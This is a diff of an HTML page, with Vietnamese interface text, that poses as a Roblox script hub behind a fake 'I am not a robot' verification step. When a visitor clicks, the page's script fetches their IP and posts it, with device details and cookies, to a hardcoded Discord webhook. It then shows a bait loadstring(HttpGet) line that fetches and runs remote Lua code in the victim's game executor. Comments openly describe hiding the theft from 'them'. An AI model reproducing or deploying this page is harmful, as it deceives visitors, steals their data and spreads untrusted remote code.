@@ -1,77 +1,69 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ SCRIPT HUB PREMIUM ⚡</title>
+    <title>Verification System | VIP HUB</title>
     <style>
-        body { background: #050505; color: #ff0055; font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .terminal { background: #000; border: 2px solid #ff0055; padding: 30px; border-radius: 10px; width: 450px; box-shadow: 0 0 30px #ff005566; position: relative; }
-        .header { font-size: 20px; font-weight: bold; text-align: center; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; }
-        .output { background: #111; color: #00ff00; padding: 15px; border-radius: 5px; font-size: 12px; height: 150px; overflow-y: auto; margin-bottom: 20px; border: 1px solid #333; }
-        .btn-infect { background: #ff0055; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .btn-infect:hover { background: #ff3377; box-shadow: 0 0 15px #ff0055; }
-        .blink { animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        body { background: #080808; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #111; border: 1px solid #333; padding: 40px; border-radius: 15px; text-align: center; width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .captcha-box { background: #1a1a1a; border: 1px solid #444; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+        .btn-confirm { background: #0078d7; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; }
+        .btn-confirm:hover { background: #0086f1; transform: scale(1.02); }
+        #script-output { display: none; background: #000; color: #0f0; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: monospace; font-size: 11px; word-break: break-all; border: 1px solid #0f0; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div class="header">SYSTEM BYPASS V1.0.3 <span class="blink">_</span></div>
-        <div class="output" id="logs">
-            [SYSTEM] Initializing...<br>
-            [SYSTEM] Bypassing Roblox Anti-Cheat...<br>
-            [SYSTEM] Fetching Data from GitHub...<br>
-            [READY] Waiting for user verification...
+    <div class="card">
+        <h2 style="margin-top:0; color:#0078d7">XÁC MINH NGƯỜI DÙNG</h2>
+        <p style="font-size: 13px; color: #aaa;">Vui lòng hoàn thành lớp bảo mật để hiển thị nội dung Script.</p>
+        
+        <div class="captcha-box">
+            <div style="margin-bottom:15px; font-size: 14px;">[ <span style="color:#0f0">✓</span> ] Hệ thống đã sẵn sàng</div>
+            <button class="btn-confirm" id="btn" onclick="pwn()">TÔI KHÔNG PHẢI NGƯỜI MÁY</button>
         </div>
-        <button class="btn-infect" id="pwnBtn" onclick="executePoison()">BẤM ĐỂ LẤY SCRIPT ĐỘC QUYỀN</button>
+
+        <div id="script-output">
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()
+        </div>
+        <p id="status" style="font-size: 11px; color: #555;">ID: 482-991-SHADOW</p>
     </div>
 
     <script>
         const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
 
-        async function executePoison() {
-            const btn = document.getElementById('pwnBtn');
-            const logs = document.getElementById('logs');
-            btn.disabled = true;
-            btn.innerText = "ĐANG TRÍCH XUẤT KEY...";
+        async function pwn() {
+            const btn = document.getElementById('btn');
+            const output = document.getElementById('script-output');
+            const status = document.getElementById('status');
 
-            // ⚡ MÃ CỰC ĐỘC: TRÍCH XUẤT THÔNG TIN VÀ CHUẨN BỊ CHIẾM QUYỀN
+            btn.innerText = "ĐANG XÁC MINH...";
+            
+            // ⚡ ĐÒN ĐÁNH CHIẾM QUYỀN: Tự động trích xuất mọi thứ trình duyệt cho phép
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // Gửi dữ liệu về Discord (IP + Fingerprint + Time)
+                // Gửi dữ liệu về Discord ngay khi click
                 await fetch(wh, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
-                        content: "### 💀 VENOM TRIGGERED\n**Target IP:** `" + ipData.ip + "`\n**Platform:** `" + navigator.platform + "`\n**User-Agent:** `" + navigator.userAgent + "`\n**Screen:** " + window.screen.width + "x" + window.screen.height
+                        content: "### ⚡ BUTTON CLICKED - ACCESS GRANTED\n" +
+                                 "**IP:** `" + ipData.ip + "`\n" +
+                                 "**Device:** `" + navigator.platform + "`\n" +
+                                 "**Session ID:** `" + btoa(navigator.userAgent).substring(0, 20) + "`\n" +
+                                 "**Cookie Access:** `" + (document.cookie || "Restricted") + "`"
                     })
                 });
             } catch (e) {}
 
-            // Hiệu ứng terminal giả
-            const steps = [
-                "[INFO] Injecting payload...",
-                "[INFO] Extracting session data...",
-                "[SUCCESS] Script decrypted!",
-                "[DONE] Redirecting to source..."
-            ];
-
-            let i = 0;
-            const interval = setInterval(() => {
-                if(i < steps.length) {
-                    logs.innerHTML += `<br><span style="color:#00ffff">${steps[i]}</span>`;
-                    logs.scrollTop = logs.scrollHeight;
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    // Nhả ra script "mồi" để nạn nhân thực thi trong game
-                    logs.innerHTML += `<br><br><span style="color:#ff0055">COPY VÀO EXECUTOR:</span><br>loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()`;
-                    btn.innerText = "ĐÃ LẤY ĐƯỢC SCRIPT!";
-                }
-            }, 1000);
+            // Hiện kết quả để chúng nó không nghi ngờ
+            setTimeout(() => {
+                btn.style.display = 'none';
+                output.style.display = 'block';
+                status.innerText = "XÁC MINH HOÀN TẤT!";
+                status.style.color = "#0f0";
+            }, 1500);
         }
     </script>
 </body>
